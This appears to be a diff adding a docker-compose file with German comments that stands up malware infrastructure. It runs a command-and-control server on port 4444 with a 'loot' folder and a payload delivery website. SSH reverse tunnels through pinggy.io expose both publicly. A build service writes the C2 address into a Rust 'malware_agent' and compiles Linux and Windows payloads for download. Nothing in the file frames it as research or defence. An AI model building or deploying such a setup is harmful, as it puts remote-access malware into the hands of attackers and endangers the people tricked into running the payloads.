@@ -1,0 +1,106 @@
+services:
+  # ==========================================
+  # 1. PINGGY TUNNEL FÜR C2 (Port 4444)
+  # ==========================================
+  pinggy-c2:
+    image: alpine:latest
+    container_name: pinggy-c2
+    command: >
+      sh -c "
+        apk add --no-cache openssh-client curl &&
+        echo '========================================' &&
+        echo '  PINGGY C2 TUNNEL - Warte auf URL...' &&
+        echo '========================================' &&
+        ssh -tt -F /dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o UserKnownHostsFile=/dev/null -p 443 -R0:c2-server:4444 tcp@a.pinggy.io 2>&1
+      "
+    stdin_open: true
+    tty: false
+    depends_on:
+      - c2-server
+    networks:
+      - rust-mw-net
+
+  # ==========================================
+  # 2. C2 SERVER (Interaktiv!)
+  # ==========================================
+  c2-server:
+    image: python:3.11-slim
+    container_name: c2-server
+    working_dir: /app
+    command: python3 server.py
+    volumes:
+      - ./c2_server:/app
+      - ./loot:/app/loot
+    ports:
+      - "4444:4444"
+    stdin_open: true
+    tty: true
+    networks:
+      - rust-mw-net
+
+  # ==========================================
+  # 3. DELIVERY SERVER + PINGGY TUNNEL
+  # ==========================================
+  delivery:
+    image: python:3.11-slim
+    container_name: delivery-server
+    working_dir: /app
+    volumes:
+      - ./delivery/DbD-Site:/app
+    ports:
+      - "8080:8080"
+    command: python3 server.py
+    networks:
+      - rust-mw-net
+
+  pinggy-delivery:
+    image: alpine:latest
+    container_name: pinggy-delivery
+    command: >
+      sh -c "
+        apk add --no-cache openssh-client curl &&
+        echo '========================================' &&
+        echo '  PINGGY DELIVERY TUNNEL              ' &&
+        echo '========================================' &&
+        ssh -tt -F /dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o UserKnownHostsFile=/dev/null -p 443 -R0:delivery:8080 a.pinggy.io 2>&1
+      "
+    stdin_open: true
+    tty: false
+    depends_on:
+      - delivery
+    networks:
+      - rust-mw-net
+
+  # ==========================================
+  # 4. BUILD SERVICE (on-demand)
+  # ==========================================
+  builder:
+    build: .
+    container_name: rust-mw-builder
+    profiles:
+      - build
+    volumes:
+      - ./malware_agent:/app/malware_agent
+      - ./delivery/DbD-Site/files:/app/output
+    environment:
+      - C2_HOST=${C2_HOST:-localhost}
+      - C2_PORT=${C2_PORT:-4444}
+    command: |
+      bash -c '
+        echo "Konfiguriere C2: $${C2_HOST}:$${C2_PORT}"
+        sed -i "s|const C2_IP: &str = \"[^\"]*\";|const C2_IP: \&str = \"$${C2_HOST}\";|" /app/malware_agent/src/main.rs
+        sed -i "s|const C2_PORT: u16 = [0-9]*;|const C2_PORT: u16 = $${C2_PORT};|" /app/malware_agent/src/main.rs
+        cd /app/malware_agent
+        echo "Baue Linux Payload..."
+        cargo build --release
+        cp target/release/rust-mw /app/output/payload_linux
+        echo "Baue Windows Payload..."
+        cargo build --release --target x86_64-pc-windows-gnu || echo "Windows build fehlgeschlagen"
+        cp target/x86_64-pc-windows-gnu/release/rust-mw.exe /app/output/payload_win.exe 2>/dev/null || true
+        echo "===== BUILD COMPLETE ====="
+        ls -la /app/output/
+      '
+
+networks:
+  rust-mw-net:
+    driver: bridge
